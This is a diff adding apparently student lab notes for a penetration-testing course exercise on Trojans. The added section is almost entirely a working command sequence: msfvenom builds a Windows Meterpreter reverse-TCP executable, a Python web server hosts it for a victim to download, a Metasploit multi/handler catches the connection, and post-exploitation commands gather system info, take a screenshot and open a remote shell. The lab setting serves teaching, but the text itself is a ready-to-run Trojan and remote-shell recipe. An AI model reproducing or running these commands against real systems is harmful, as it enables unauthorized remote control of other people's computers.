@@ -191,3 +191,51 @@ A Trojan is malicious software disguised as a legitimate application. Attackers 
 
 **3) Conclusion:**
 This practical illustrates the severe danger of executing untrusted files. By utilizing a reverse TCP payload disguised as a trusted app, an attacker can effortlessly gain full, interactive remote control (Meterpreter shell) over the target machine.
+
+### Exatra 
+VAPT Exp 12
+
+
+# Generate the malicious executable
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.116 LPORT=4444 -f exe -o Lab9_Final.exe
+
+# Move it to the Desktop for easy access
+mv ~/Lab9_Final.exe ~/Desktop/
+
+# Navigate to the file location and host it
+cd ~/Desktop
+sudo python3 -m http.server 80
+
+Then on another terminal 
+# Launch Metasploit
+msfconsole
+
+# Configure the multi-handler
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.116
+set LPORT 4444
+
+# Start listening
+exploit
+                       
+On victim pc 
+Search http://192.168.0.116/Lab9_Final.exe
+With all closed 
+
+# Check system and user info
+sysinfo
+getuid
+
+# Visual Proof
+screenshot
+
+# Enter Windows Command Line
+shell
+
+# Remote Actions (Inside the Shell)
+start https://www.google.com
+start https://www.youtube.com/results?search_query=hai+apna+dil+toh+aawara
+
+# Return to Meterpreter
+exit
